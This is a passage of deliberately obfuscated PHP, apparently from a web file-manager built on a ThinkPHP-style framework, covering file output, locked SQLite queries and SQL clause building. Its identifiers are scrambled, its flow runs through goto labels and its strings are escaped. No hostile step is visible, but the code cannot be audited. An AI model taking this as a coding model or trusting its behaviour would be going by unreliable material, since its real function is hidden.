($f×Š¸ŸÓõ) { return IO::fileOutServer($a¨¦ùªÜâê[$aÏ°‘¬[75]], $Aõ¡¬Ú‚ÌÁ, $D§İ‚ÓœõÔ, $EÜ÷ë•Âø); } IO::fileOut($a¨¦ùªÜâê[$aÏ°‘¬[75]], $Aõ¡¬Ú‚ÌÁ, $D§İ‚ÓœõÔ, $EÜ÷ë•Âø); goto EµÕ÷¸ç¤¦; EµÕ÷¸ç¤¦: } public function fileOut($fÖÙˆÓôÒ„, $Bßâ‚Èš = false, $EùÚ¶‹—¹³ = false, $CÆõ£¬Å·ğ = '') { $this->_fileOut($fÖÙˆÓôÒ„, $Bßâ‚Èš, $EùÚ¶‹—¹³, $CÆõ£¬Å·ğ); } public function fileOutServer($BãŞÙÊ´ÆÔ, $A‰å¬¥Ö = false, $Bã¿œğˆòÓ = false, $B»°ÃÊ¯ˆ = '') { $this->_fileOut($BãŞÙÊ´ÆÔ, $A‰å¬¥Ö, $Bã¿œğˆòÓ, $B»°ÃÊ¯ˆ, !0); } protected function _fileOutImage($böÏÒ¼øÀ, $AîÜøõ¢ = 250) { $d©´ÓæÖˆŠ =& $_SERVER[Äº¡•ô™Ÿ]; $c·ˆ‰Š·†§ = $this->model->sourceInfo($böÏÒ¼øÀ); if ($c·ˆ‰Š·†§[$d©´ÓæÖˆŠ[367]] == $d©´ÓæÖˆŠ[83]) { show_json($d©´ÓæÖˆŠ[1114] . $böÏÒ¼øÀ, !1); } $GLOBALS[$d©´ÓæÖˆŠ[1113]] = $c·ˆ‰Š·†§[$d©´ÓæÖˆŠ[28]]; $BÑ˜–†Û¾ = $this->model->fileInfoGet($böÏÒ¼øÀ); IO::fileOutImage($BÑ˜–†Û¾[$d©´ÓæÖˆŠ[75]], $AîÜøõ¢); } public function fileOutImage($fŒÂ–äæ, $bëÆº¨ö·¾ = 250) { $this->_fileOutImage($fŒÂ–äæ, $bëÆº¨ö·¾); } public function fileOutImageServer($f§×ö¬¹÷¢, $DÈù¢ƒÀÈõ = 250) { $this->_fileOutImage($f§×ö¬¹÷¢, $DÈù¢ƒÀÈõ); } public function link($C¶Š£†Íƒâ, $aÚÅ®’Ç›º = '') { $B‘ÑšÍî† = $this->model->fileInfoGet($C¶Š£†Íƒâ); return IO::link($B‘ÑšÍî†[$_SERVER[Äº¡•ô™Ÿ][75]], $aÚÅ®’Ç›º); } protected function parse($D—Ôë»éè„) { $bÄ‡²›±¨ =& $_SERVER[Äº¡•ô™Ÿ]; if (strstr($D—Ôë»éè„, $bÄ‡²›±¨[8]) === !1) { return array($bÄ‡²›±¨[382] => intval($D—Ôë»éè„), $bÄ‡²›±¨[75] => $bÄ‡²›±¨[33], $bÄ‡²›±¨[1111] => array()); } $DèÉòµ‹ƒ = explode($bÄ‡²›±¨[8], trim($D—Ôë»éè„, $bÄ‡²›±¨[8])); if (count($DèÉòµ‹ƒ) < 2) { show_tips($D—Ôë»éè„ . $bÄ‡²›±¨[1115]); } return array($bÄ‡²›±¨[382] => intval($DèÉòµ‹ƒ[0]), $bÄ‡²›±¨[75] => $DèÉòµ‹ƒ[1], $bÄ‡²›±¨[1111] => array_slice($DèÉòµ‹ƒ, 1)); } } goto EÈÇ·¹Ÿë; eÃÓ° …›: function beforeShutdownFatalError($DËœµéÄîî) { think_exception($DËœµéÄîî); } $_SERVER[$_SERVER[•Éº±‡£‰èä][48]] = $bÎäÏø§˜©($_SERVER[$_SERVER[•Éº±‡£‰èä][45]]); $A™›³ãÀ´ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto f‡­â¬‚‘à; e·ÂÀªšÄ‰: class DbSqlite extends DbSqliteBase { public function query($FÔÍôõİï) { goto e¤ŞÀÓ´Ú; e¤ŞÀÓ´Ú: $aÙ‚Àò£óÊ =& $_SERVER[Äº¡•ô™Ÿ]; $e÷·ÖÖÒ’Ş = DATA_PATH . $aÙ‚Àò£óÊ[874]; $câ»òÀÒ§Õ = fopen($e÷·ÖÖÒ’Ş, $aÙ‚Àò£óÊ[875]); goto AæÉ®Òªá; AæÉ®Òªá: if (!$câ»òÀÒ§Õ) { return !1; } if (flock($câ»òÀÒ§Õ, LOCK_EX)) { $Dï¶Ö„’ = parent::query($FÔÍôõİï); flock($câ»òÀÒ§Õ, LOCK_UN); fclose($câ»òÀÒ§Õ); return $Dï¶Ö„’; } flock($câ»òÀÒ§Õ, LOCK_UN); goto eŠ©â›™ˆ§; eŠ©â›™ˆ§: fclose($câ»òÀÒ§Õ); show_json($aÙ‚Àò£óÊ[876], !1); return !1; goto c³Äí¹ŠÕ¹; c³Äí¹ŠÕ¹: } public function execute($Dø¹³„ØÛŸ) { goto CŞÚ¾äˆ¤±; aÃøËÑïï: if (!$B»¨ƒ‹¨ê•) { return !1; } if (flock($B»¨ƒ‹¨ê•, LOCK_EX)) { $fÕŠâß• = parent::execute($Dø¹³„ØÛŸ); flock($B»¨ƒ‹¨ê•, LOCK_UN); fclose($B»¨ƒ‹¨ê•); return $fÕŠâß•; } flock($B»¨ƒ‹¨ê•, LOCK_UN); goto B‘ÏÓÕ™æâ; CŞÚ¾äˆ¤±: $eÓæâŒö© =& $_SERVER[Äº¡•ô™Ÿ]; $Cá“ñ¶‰ÇÙ = DATA_PATH . $eÓæâŒö©[874]; $B»¨ƒ‹¨ê• = fopen($Cá“ñ¶‰ÇÙ, $eÓæâŒö©[875]); goto aÃøËÑïï; B‘ÏÓÕ™æâ: fclose($B»¨ƒ‹¨ê•); show_json($eÓæâŒö©[876], !1); return !1; goto b¢ƒÄ‚¿º‘; b¢ƒÄ‚¿º‘: } } class DbSqlite3 extends DbSqlite3Base { public function query($BËŠªËœ„Û) { goto Fà°Èö¼Ã; DßÎÇ¿ó†: fclose($F¤Ì»¾©­Û); show_json($Aå¸éá×Ó[876], !1); return !1; goto EµØŒ®‡“‰; Fà°Èö¼Ã: $Aå¸éá×Ó =& $_SERVER[Äº¡•ô™Ÿ]; $FƒùÖù¯³ì = DATA_PATH . $Aå¸éá×Ó[874]; $F¤Ì»¾©­Û = fopen($FƒùÖù¯³ì, $Aå¸éá×Ó[875]); goto A»œ¸–ù»¹; A»œ¸–ù»¹: if (!$F¤Ì»¾©­Û) { return !1; } if (flock($F¤Ì»¾©­Û, LOCK_EX)) { $bÃê¹Ãê‡§ = parent::query($BËŠªËœ„Û); flock($F¤Ì»¾©­Û, LOCK_UN); fclose($F¤Ì»¾©­Û); return $bÃê¹Ãê‡§; } flock($F¤Ì»¾©­Û, LOCK_UN); goto DßÎÇ¿ó†; EµØŒ®‡“‰: } public function execute($b—”ƒ÷êÚ•) { goto dµ¢ì‡Ÿ÷Ø; dµ¢ì‡Ÿ÷Ø: $Bç£‘òæÔß =& $_SERVER[Äº¡•ô™Ÿ]; $eŒƒ•Úã‘¼ = DATA_PATH . $Bç£‘òæÔß[874]; $d÷Šâö·åÍ = fopen($eŒƒ•Úã‘¼, $Bç£‘òæÔß[875]); goto e‰Ÿ’â£‹õ; Dˆ¥¯àË‚: fclose($d÷Šâö·åÍ); show_json($Bç£‘òæÔß[876], !1); return !1; goto c¢™¦»·‘; e‰Ÿ’â£‹õ: if (!$d÷Šâö·åÍ) { return !1; } if (flock($d÷Šâö·åÍ, LOCK_EX)) { $E¸îŸÊóì = parent::execute($b—”ƒ÷êÚ•); flock($d÷Šâö·åÍ, LOCK_UN); fclose($d÷Šâö·åÍ); return $E¸îŸÊóì; } flock($d÷Šâö·åÍ, LOCK_UN); goto Dˆ¥¯àË‚; c¢™¦»·‘: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\74\x3e", "\147\x74" => "\x3e", "\145\x67\164" => "\x3e\x3d", "\154\x74" => "\x3c", "\x65\154\x74" => "\74\x3d", "\x6e\x6f\164\x6c\x69\x6b\x65" => "\116\x4f\x54\x20\114\111\113\x45", "\154\151\153\x65" => "\114\x49\x4b\x45", "\151\156" => "\x49\116", "\156\157\x74\151\156" => "\x4e\x4f\124\40\111\116", "\156\157\x74\40\151\x6e" => "\x4e\117\124\x20\x49\x4e", "\142\x65\x74\x77\x65\145\156" => "\102\x45\x54\x57\x45\105\x4e", "\156\157\x74\142\145\164\x77\x65\x65\156" => "\116\117\124\x20\102\x45\x54\127\105\105\116", "\x6e\x6f\164\x20\142\145\x74\x77\x65\x65\x6e" => "\116\x4f\124\40\102\105\124\127\105\x45\x4e"); protected $selectSql = "\x53\105\114\x45\x43\124\45\104\111\123\124\x49\x4e\x43\124\45\x20\45\x46\111\x45\x4c\104\x25\40\x46\122\117\115\x20\x25\124\101\x42\114\x45\x25\45\x4a\117\x49\116\x25\45\x57\110\105\122\105\45\x25\x47\122\117\125\x50\x25\x25\x48\101\126\x49\x4e\x47\x25\x25\x4f\122\104\105\x52\x25\45\114\x49\x4d\111\124\x25\x20\45\x55\x4e\111\x4f\116\x25\45\x43\117\x4d\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $dòçÓˆ•ì = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Äº¡•ô™Ÿ][877], $dòçÓˆ•ì); } public function factory($EëÈ©öŠØ× = '') { goto B®íØ¡æÏµ; B®íØ¡æÏµ: $c¸Œ ˜Â¬š =& $_SERVER[Äº¡•ô™Ÿ]; $EëÈ©öŠØ× = $this->parseConfig($EëÈ©öŠØ×); if (empty($EëÈ©öŠØ×[$c¸Œ ˜Â¬š[878]])) { think_exception(think_lang($c¸Œ ˜Â¬š[879])); } goto EÚÅ™®ÄÎ‡; D½¹‹†’‘: return $f±§İèˆ; goto CÓ¤æƒ÷ˆ; EÚÅ™®ÄÎ‡: $this->dbType = ucwords(strtolower($EëÈ©öŠØ×[$c¸Œ ˜Â¬š[878]])); $DñÀÅÉ = $c¸Œ ˜Â¬š[880] . $this->dbType; if (class_exists($DñÀÅÉ)) { $f±§İèˆ = new $DñÀÅÉ($EëÈ©öŠØ×); if ($c¸Œ ˜Â¬š[727] != strtolower($EëÈ©öŠØ×[$c¸Œ ˜Â¬š[878]])) { $f±§İèˆ->dbType = strtoupper($this->dbType); } else { $f±§İèˆ->dbType = $this->_getDsnType($EëÈ©öŠØ×[$c¸Œ ˜Â¬š[830]]); } } else { think_exception(think_lang($c¸Œ ˜Â¬š[881]) . $c¸Œ ˜Â¬š[882] . $DñÀÅÉ); } goto D½¹‹†’‘; CÓ¤æƒ÷ˆ: } public function __call($E«ø‚Õ½ù­, $BÁÍÖã½ĞÌ) { if (method_exists($this, $E«ø‚Õ½ù­)) { return call_user_func_array(array($this, $E«ø‚Õ½ù­), $BÁÍÖã½ĞÌ); } } protected function _getDsnType($bÔš¬¡”Û‘) { $BË‰ƒã…‚¢ = explode($_SERVER[Äº¡•ô™Ÿ][4], $bÔš¬¡”Û‘); $eÌñËæ®™Æ = strtoupper(trim($BË‰ƒã…‚¢[0])); return $eÌñËæ®™Æ; } private function parseConfig($E­­ê¾–”Æ = '') { $e†­¡¬Éå¯ =& $_SERVER[Äº¡•ô™Ÿ]; if (!empty($E­­ê¾–”Æ) && is_string($E­­ê¾–”Æ)) { $E­­ê¾–”Æ = $this->parseDSN($E­­ê¾–”Æ); } elseif (is_array($E­­ê¾–”Æ)) { $E­­ê¾–”Æ = array_change_key_case($E­­ê¾–”Æ); $E­­ê¾–”Æ = array($e†­¡¬Éå¯[878] => $E­­ê¾–”Æ[$e†­¡¬Éå¯[726]], $e†­¡¬Éå¯[803] => $E­­ê¾–”Æ[$e†­¡¬Éå¯[883]], $e†­¡¬Éå¯[804] => $E­­ê¾–”Æ[$e†­¡¬Éå¯[884]], $e†­¡¬Éå¯[801] => $E­­ê¾–”Æ[$e†­¡¬Éå¯[885]], $e†­¡¬Éå¯[802] => $E­­ê¾–”Æ[$e†­¡¬Éå¯[886]], $e†­¡¬Éå¯[17] => $E­­ê¾–”Æ[$e†­¡¬Éå¯[887]], $e†­¡¬Éå¯[830] => $E­­ê¾–”Æ[$e†­¡¬Éå¯[728]], $e†­¡¬Éå¯[13] => isset($E­­ê¾–”Æ[$e†­¡¬Éå¯[888]]) ? $E­­ê¾–”Æ[$e†­¡¬Éå¯[888]] : array()); } elseif (empty($E­­ê¾–”Æ)) { if (think_config($e†­¡¬Éå¯[889]) && $e†­¡¬Éå¯[727] != strtolower(think_config($e†­¡¬Éå¯[890]))) { $E­­ê¾–”Æ = $this->parseDSN(think_config($e†­¡¬Éå¯[889])); } else { $E­­ê¾–”Æ = array($e†­¡¬Éå¯[878] => think_config($e†­¡¬Éå¯[890]), $e†­¡¬Éå¯[803] => think_config($e†­¡¬Éå¯[891]), $e†­¡¬Éå¯[804] => think_config($e†­¡¬Éå¯[892]), $e†­¡¬Éå¯[801] => think_config($e†­¡¬Éå¯[893]), $e†­¡¬Éå¯[802] => think_config($e†­¡¬Éå¯[894]), $e†­¡¬Éå¯[17] => think_config($e†­¡¬Éå¯[231]), $e†­¡¬Éå¯[830] => think_config($e†­¡¬Éå¯[889]), $e†­¡¬Éå¯[13] => think_config($e†­¡¬Éå¯[895])); } } return $E­­ê¾–”Æ; } protected function initConnect($B·íè¡‰ë = true) { if (1 == think_config($_SERVER[Äº¡•ô™Ÿ][18])) { $this->_linkID = $this->multiConnect($B·íè¡‰ë); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($cµÁöÇˆ = false) { $Dî¸óÙæš° =& $_SERVER[Äº¡•ô™Ÿ]; static $F‰¬èô¢³¥ = array(); if (empty($F‰¬èô¢³¥)) { foreach ($this->config as $AÏÂ™ÓÏ‡¢ => $f¯”²“ƒˆÄ) { $F‰¬èô¢³¥[$AÏÂ™ÓÏ‡¢] = explode($Dî¸óÙæš°[47], $f¯”²“ƒˆÄ); } } if (think_config($Dî¸óÙæš°[896])) { if ($cµÁöÇˆ) { $eÃÔã†Ãß = floor(mt_rand(0, think_config($Dî¸óÙæš°[897]) - 1)); } else { if (is_numeric(think_config($Dî¸óÙæš°[898]))) { $eÃÔã†Ãß = think_config($Dî¸óÙæš°[898]); } else { $eÃÔã†Ãß = floor(mt_rand(think_config($Dî¸óÙæš°[897]), count($F‰¬èô¢³¥[$Dî¸óÙæš°[801]]) - 1)); } } } else { $eÃÔã†Ãß = floor(mt_rand(0, count($F‰¬èô¢³¥[$Dî¸óÙæš°[801]]) - 1)); } $b‘Ì­•åµ = array($Dî¸óÙæš°[803] => isset($F‰¬èô¢³¥[$Dî¸óÙæš°[803]][$eÃÔã†Ãß]) ? $F‰¬èô¢³¥[$Dî¸óÙæš°[803]][$eÃÔã†Ãß] : $F‰¬èô¢³¥[$Dî¸óÙæš°[803]][0], $Dî¸óÙæš°[804] => isset($F‰¬èô¢³¥[$Dî¸óÙæš°[804]][$eÃÔã†Ãß]) ? $F‰¬èô¢³¥[$Dî¸óÙæš°[804]][$eÃÔã†Ãß] : $F‰¬èô¢³¥[$Dî¸óÙæš°[804]][0], $Dî¸óÙæš°[801] => isset($F‰¬èô¢³¥[$Dî¸óÙæš°[801]][$eÃÔã†Ãß]) ? $F‰¬èô¢³¥[$Dî¸óÙæš°[801]][$eÃÔã†Ãß] : $F‰¬èô¢³¥[$Dî¸óÙæš°[801]][0], $Dî¸óÙæš°[802] => isset($F‰¬èô¢³¥[$Dî¸óÙæš°[802]][$eÃÔã†Ãß]) ? $F‰¬èô¢³¥[$Dî¸óÙæš°[802]][$eÃÔã†Ãß] : $F‰¬èô¢³¥[$Dî¸óÙæš°[802]][0], $Dî¸óÙæš°[17] => isset($F‰¬èô¢³¥[$Dî¸óÙæš°[17]][$eÃÔã†Ãß]) ? $F‰¬èô¢³¥[$Dî¸óÙæš°[17]][$eÃÔã†Ãß] : $F‰¬èô¢³¥[$Dî¸óÙæš°[17]][0], $Dî¸óÙæš°[830] => isset($F‰¬èô¢³¥[$Dî¸óÙæš°[830]][$eÃÔã†Ãß]) ? $F‰¬èô¢³¥[$Dî¸óÙæš°[830]][$eÃÔã†Ãß] : $F‰¬èô¢³¥[$Dî¸óÙæš°[830]][0], $Dî¸óÙæš°[13] => isset($F‰¬èô¢³¥[$Dî¸óÙæš°[13]][$eÃÔã†Ãß]) ? $F‰¬èô¢³¥[$Dî¸óÙæš°[13]][$eÃÔã†Ãß] : $F‰¬èô¢³¥[$Dî¸óÙæš°[13]][0]); return $this->connect($b‘Ì­•åµ, $eÃÔã†Ãß); } public function parseDSN($c¶ŒÀ‰ÍÖí) { $Fé¨ßˆñœ˜ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($c¶ŒÀ‰ÍÖí)) { return !1; } $d§Ş™õ¸‚ = parse_url($c¶ŒÀ‰ÍÖí); if ($d§Ş™õ¸‚[$Fé¨ßˆñœ˜[165]]) { $bëÏ—òƒ‹» = array($Fé¨ßˆñœ˜[878] => $d§Ş™õ¸‚[$Fé¨ßˆñœ˜[165]], $Fé¨ßˆñœ˜[803] => isset($d§Ş™õ¸‚[$Fé¨ßˆñœ˜[531]]) ? $d§Ş™õ¸‚[$Fé¨ßˆñœ˜[531]] : $Fé¨ßˆñœ˜[33], $Fé¨ßˆñœ˜[804] => isset($d§Ş™õ¸‚[$Fé¨ßˆñœ˜[899]]) ? $d§Ş™õ¸‚[$Fé¨ßˆñœ˜[899]] : $Fé¨ßˆñœ˜[33], $Fé¨ßˆñœ˜[801] => isset($d§Ş™õ¸‚[$Fé¨ßˆñœ˜[166]]) ? $d§Ş™õ¸‚[$Fé¨ßˆñœ˜[166]] : $Fé¨ßˆñœ˜[33], $Fé¨ßˆñœ˜[802] => isset($d§Ş™õ¸‚[$Fé¨ßˆñœ˜[167]]) ? $d§Ş™õ¸‚[$Fé¨ßˆñœ˜[167]] : $Fé¨ßˆñœ˜[33], $Fé¨ßˆñœ˜[17] => isset($d§Ş™õ¸‚[$Fé¨ßˆñœ˜[75]]) ? substr($d§Ş™õ¸‚[$Fé¨ßˆñœ˜[75]], 1) : $Fé¨ßˆñœ˜[33]); } else { preg_match($Fé¨ßˆñœ˜[900], trim($c¶ŒÀ‰ÍÖí), $D·ööÒ–Ğ¼); $bëÏ—òƒ‹» = array($Fé¨ßˆñœ˜[878] => $D·ööÒ–Ğ¼[1], $Fé¨ßˆñœ˜[803] => $D·ööÒ–Ğ¼[2], $Fé¨ßˆñœ˜[804] => $D·ööÒ–Ğ¼[3], $Fé¨ßˆñœ˜[801] => $D·ööÒ–Ğ¼[4], $Fé¨ßˆñœ˜[802] => $D·ööÒ–Ğ¼[5], $Fé¨ßˆñœ˜[17] => $D·ööÒ–Ğ¼[6]); } $bëÏ—òƒ‹»[$Fé¨ßˆñœ˜[830]] = $Fé¨ßˆñœ˜[33]; return $bëÏ—òƒ‹»; } protected function debug() { $e„àÑÄ®‰« =& $_SERVER[Äº¡•ô™Ÿ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $e„àÑÄ®‰«[901]; if (think_config($e„àÑÄ®‰«[902])) { think_status($e„àÑÄ®‰«[903]); think_trace($this->queryStr . $e„àÑÄ®‰«[904] . think_status($e„àÑÄ®‰«[20], $e„àÑÄ®‰«[903], 6) . $e„àÑÄ®‰«[905], $e„àÑÄ®‰«[33], $e„àÑÄ®‰«[906]); } } protected function parseLock($bÆ«ÊèŠÍñ = false) { $F´°ØÕ±¦Ü =& $_SERVER[Äº¡•ô™Ÿ]; if (!$bÆ«ÊèŠÍñ) { return $F´°ØÕ±¦Ü[33]; } if ($F´°ØÕ±¦Ü[832] == $this->dbType) { return $F´°ØÕ±¦Ü[907]; } return $F´°ØÕ±¦Ü[908]; } protected function parseSet($cá–â·¥Õ°) { $CÍ®›ï =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($cá–â·¥Õ° as $BÚ²¦›ÏÕ => $dŞ–š¦±ÑÇ) { if (is_array($dŞ–š¦±ÑÇ) && $CÍ®›ï[282] == $dŞ–š¦±ÑÇ[0]) { $C³œÖÖ¸ãå[] = $this->parseKey($BÚ²¦›ÏÕ) . $CÍ®›ï[909] . $dŞ–š¦±ÑÇ[1]; } elseif (is_scalar($dŞ–š¦±ÑÇ) || is_null($dŞ–š¦±ÑÇ)) { $C³œÖÖ¸ãå[] = $this->parseKey($BÚ²¦›ÏÕ) . $CÍ®›ï[909] . $this->parseValue($dŞ–š¦±ÑÇ); } } return $CÍ®›ï[910] . implode($CÍ®›ï[47], $C³œÖÖ¸ãå); } protected function bindParam($F ÍÌ¡‰‹ù, $d¶ˆÔ¼×Ÿ) { $this->bind[$_SERVER[Äº¡•ô™Ÿ][4] . $F ÍÌ¡‰‹ù] = $d¶ˆÔ¼×Ÿ; } protected function parseBind($A¾…Š·Ó) { $A¾…Š·Ó = array_merge($this->bind, $A¾…Š·Ó); $this->bind = array(); return $A¾…Š·Ó; } function parseKey(&$a«õğ£‘¨, $DØ™±™ëğÛ = true) { if ($DØ™±™ëğÛ) { $a«õğ£‘¨ = $this->parseKeyCheck($a«õğ£‘¨); } return $a«õğ£‘¨; } function parseKeyCheck($C¾“ŠÓØ°) { $AÄôæªŒ¶• =& $_SERVER[Äº¡•ô™Ÿ]; $C¾“ŠÓØ° = trim($C¾“ŠÓØ°); if (!preg_match($AÄôæªŒ¶•[911], $C¾“ŠÓØ°)) { think_exception($AÄôæªŒ¶•[912] . $C¾“ŠÓØ°); } return $C¾“ŠÓØ°; } protected function parseValue($b¹ĞÍöƒÕ¡) { $b—É‚½®Ò =& $_SERVER[Äº¡•ô™Ÿ]; if (is_string($b¹ĞÍöƒÕ¡)) { $b¹ĞÍöƒÕ¡ = $b—É‚½®Ò[871] . $this->escapeString($b¹ĞÍöƒÕ¡) . $b—É‚½®Ò[871]; } elseif (isset($b¹ĞÍöƒÕ¡[0]) && is_string($b¹ĞÍöƒÕ¡[0]) && strtolower($b¹ĞÍöƒÕ¡[0]) == $b—É‚½®Ò[282]) { $b¹ĞÍöƒÕ¡ = $this->escapeString($b¹ĞÍöƒÕ¡[1]); } elseif (is_array($b¹ĞÍöƒÕ¡)) { $b¹ĞÍöƒÕ¡ = array_map(array($this, $b—É‚½®Ò[872]), $b¹ĞÍöƒÕ¡); } elseif (is_bool($b¹ĞÍöƒÕ¡)) { $b¹ĞÍöƒÕ¡ = $b¹ĞÍöƒÕ¡ ? $b—É‚½®Ò[83] : $b—É‚½®Ò[464]; } elseif (is_null($b¹ĞÍöƒÕ¡)) { $b¹ĞÍöƒÕ¡ = $b—É‚½®Ò[101]; } return $b¹ĞÍöƒÕ¡; } protected function parseField($Eå›Å‰é¿) { $b¬Éà»ÔÎ =& $_SERVER[Äº¡•ô™Ÿ]; if (is_string($Eå›Å‰é¿) && strpos($Eå›Å‰é¿, $b¬Éà»ÔÎ[47])) { $Eå›Å‰é¿ = explode($b¬Éà»ÔÎ[47], $Eå›Å‰é¿); } if (is_array($Eå›Å‰é¿)) { $e½ğ®åÄ = array(); foreach ($Eå›Å‰é¿ as $dö©ªÓã => $BØòº•š²™) { if (!is_numeric($dö©ªÓã)) { $e½ğ®åÄ[] = $this->parseKey($dö©ªÓã) . $b¬Éà»ÔÎ[913] . $this->parseKey($BØòº•š²™); } else { $e½ğ®åÄ[] = $this->parseKey($BØòº•š²™); } } $Eª´ÛÕğâ— = implode($b¬Éà»ÔÎ[47], $e½ğ®åÄ); } elseif (is_string($Eå›Å‰é¿) && !empty($Eå›Å‰é¿)) { $Eª´ÛÕğâ— = $Eå›Å‰é¿; } else { $Eª´ÛÕğâ— = $b¬Éà»ÔÎ[173]; } return $Eª´ÛÕğâ—; } protected function parseTable($E´Œ‡‰ì¢‘) { $cß“ÒÖâ© =& $_SERVER[Äº¡•ô™Ÿ]; if (is_array($E´Œ‡‰ì¢‘)) { $a¶°÷‹†’ñ = array(); foreach ($E´Œ‡‰ì¢‘ as $B¸ˆÖ†ï•¬ => $C”¬Îø‰Á) { if (!is_numeric($B¸ˆÖ†ï•¬)) { $a¶°÷‹†’ñ[] = $this->parseKey($B¸ˆÖ†ï•¬) . $cß“ÒÖâ©[50] . $this->parseKey($C”¬Îø‰Á); } else { $a¶°÷‹†’ñ[] = $this->parseKey($B¸ˆÖ†ï•¬); } } $E´Œ‡‰ì¢‘ = $a¶°÷‹†’ñ; } elseif (is_string($E´Œ‡‰ì¢‘)) { if (strstr($E´Œ‡‰ì¢‘, $cß“ÒÖâ©[50])) { return $E´Œ‡‰ì¢‘; } $E´Œ‡‰ì¢‘ = explode($cß“ÒÖâ©[47], $E´Œ‡‰ì¢‘); array_walk($E´Œ‡‰ì¢‘, array($this, $cß“ÒÖâ©[820])); } return $cß“ÒÖâ©[914] . trim(implode($cß“ÒÖâ©[915], $E´Œ‡‰ì¢‘), $cß“ÒÖâ©[826]) . $cß“ÒÖâ©[914]; } protected function parseWhere($eÊ¢˜öÅ„ø) { $e„‘ÛÚ«­« =& $_SERVER[Äº¡•ô™Ÿ]; $cÜ¥‡®éÛÔ = $e„‘ÛÚ«­«[33]; if (is_string($eÊ¢˜öÅ„ø)) { $cÜ¥‡®éÛÔ = $eÊ¢˜öÅ„ø; } else { $DçÅË›®¬­ = isset($eÊ¢˜öÅ„ø[$e„‘ÛÚ«­«[916]]) ? strtoupper($eÊ¢˜öÅ„ø[$e„‘ÛÚ«­«[916]]) : $e„‘ÛÚ«­«[33]; if (in_array($DçÅË›®¬­, array($e„‘ÛÚ«­«[917], $e„‘ÛÚ«­«[918], $e„‘ÛÚ«­«[919]))) { $DçÅË›®¬­ = $e„‘ÛÚ«­«[50] . $DçÅË›®¬­ . $e„‘ÛÚ«­«[50]; unset($eÊ¢˜öÅ„ø[$e„‘ÛÚ«­«[916]]); } else { $DçÅË›®¬­ = $e„‘ÛÚ«­«[920]; } foreach ($eÊ¢˜öÅ„ø as $fö¼²¯˜ã => $b“ÁäŸ²Ó²) { $cÜ¥‡®éÛÔ .= $e„‘ÛÚ«­«[262]; if (is_numeric($fö¼²¯˜ã)) { $fö¼²¯˜ã = $e„‘ÛÚ«­«[921]; } if (0 === strpos($fö¼²¯˜ã, $e„‘ÛÚ«­«[70])) { $cÜ¥‡®éÛÔ .= $this->parseThinkWhere($fö¼²¯˜ã, $b“ÁäŸ²Ó²); } else { if (!preg_match($e„‘ÛÚ«­«[922], trim($fö¼²¯˜ã))) { think_exception(think_lang($e„‘ÛÚ«­«[923]) . $e„‘ÛÚ«­«[4] . $fö¼²¯˜ã); } $B°­µàÄ¥Ó = is_array($b“ÁäŸ²Ó²) && isset($b“ÁäŸ²Ó²[$e„‘ÛÚ«­«[924]]); $fö¼²¯˜ã = trim($fö¼²¯˜ã); if (strpos($fö¼²¯˜ã, $e„‘ÛÚ«­«[268])) { $dŒĞ°«Åè = explode($e„‘ÛÚ«­«[268], $fö¼²¯˜ã); $a‹“¡Ù©éÃ = array(); foreach ($dŒĞ°«Åè as $e¾—”¹ÌÇì => $bÚ…Îî¾è½) { $bìêÁªòÍî = $B°­µàÄ¥Ó ? $b“ÁäŸ²Ó²[$e¾—”¹ÌÇì] : $b“ÁäŸ²Ó²; $a‹“¡Ù©éÃ[] = $e„‘ÛÚ«­«[245] . $this->parseWhereItem($this->parseKey($bÚ…Îî¾è½), $bìêÁªòÍî) . $e„‘ÛÚ«­«[819]; } $cÜ¥‡®éÛÔ .= implode($e„‘ÛÚ«­«[925], $a‹“¡Ù©éÃ); } elseif (strpos($fö¼²¯˜ã, $e„‘ÛÚ«­«[269])) { $dŒĞ°«Åè = explode($e„‘ÛÚ«­«[269], $fö¼²¯˜ã); $a‹“¡Ù©éÃ = array(); foreach ($dŒĞ°«Åè as $e¾—”¹ÌÇì => $bÚ…Îî¾è½) { $bìêÁªòÍî = $B°­µàÄ¥Ó ? $b“ÁäŸ²Ó²[$e¾—”¹ÌÇì] : $b“ÁäŸ²Ó²; $a‹“¡Ù©éÃ[] = $e„‘ÛÚ«­«[245] . $this->parseWhereItem($this->parseKey($bÚ…Îî¾è½), $bìêÁªòÍî) . $e„‘ÛÚ«­«[819]; } $cÜ¥‡®éÛÔ .= implode($e„‘ÛÚ«­«[920], $a‹“¡Ù©éÃ); } else { $cÜ¥‡®éÛÔ .= $this->parseWhereItem($this->parseKey($fö¼²¯˜ã), $b“ÁäŸ²Ó²); } } $cÜ¥‡®éÛÔ .= $e„‘ÛÚ«­«[263] . $DçÅË›®¬­; } $cÜ¥‡®éÛÔ = substr($cÜ¥‡®éÛÔ, 0, -strlen($DçÅË›®¬­)); } return empty($cÜ¥‡®éÛÔ) ? $e„‘ÛÚ«­«[33] : $e„‘ÛÚ«­«[926] . $cÜ¥‡®éÛÔ; } protected function parseWhereItem($cä¾“Éôµ, $aï˜±—òØ’) { $Eâ“Ç‚à–‡ =& $_SERVER[Äº¡•ô™Ÿ]; $Eùš³İŒ = $Eâ“Ç‚à–‡[33]; if (is_array($aï˜±—òØ’)) { if (is_string($aï˜±—òØ’[0])) { $E†¦¬‹¹â = strtolower($aï˜±—òØ’[0]); if (in_array($aï˜±—òØ’[0], array($Eâ“Ç‚à–‡[909], $Eâ“Ç‚à–‡[927], $Eâ“Ç‚à–‡[928], $Eâ“Ç‚à–‡[929], $Eâ“Ç‚à–‡[930], $Eâ“Ç‚à–‡[931]))) { $Eùš³İŒ .= $cä¾“Éôµ . $Eâ“Ç‚à–‡[50] . $aï˜±—òØ’[0] . $Eâ“Ç‚à–‡[50] . $this->parseValue($aï˜±—òØ’[1]); } elseif (preg_match($Eâ“Ç‚à–‡[932], $aï˜±—òØ’[0])) { 